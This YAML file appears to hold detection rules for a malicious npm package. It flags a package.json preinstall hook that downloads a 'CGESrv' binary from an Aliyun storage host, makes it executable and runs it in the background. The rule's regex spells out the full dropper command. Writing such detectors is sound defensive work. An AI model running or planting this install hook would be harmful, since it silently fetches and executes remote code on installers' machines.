defaults:
  platforms: [linux]
  attack: T1195.002,T1105,T1059.004,T1543.003

traits:
  - id: boss-ops-oss-npm-install-dropper
    desc: Install hook downloads and detached-runs the boss-ops CGESrv binary
    crit: suspicious
    conf: 0.995
    for: [package.json]
    if:
      type: text
      regex: '"preinstall"\s*:\s*"curl\s+-sSL\s+https://boss-ops\.oss-cn-beijing\.aliyuncs\.com/CGESrv\s+-o\s+/tmp/CGESrv\s*&&\s*chmod\s+777\s+/tmp/CGESrv\s*&&\s*nohup\s+/tmp/CGESrv\s*&'

composite_rules:
  - id: npm-boss-ops-oss-detached-binary
    desc: npm preinstall downloads and launches a detached boss-ops binary
    crit: hostile
    conf: 0.995
    scope: file
    all:
      - id: boss-ops-oss-npm-install-dropper
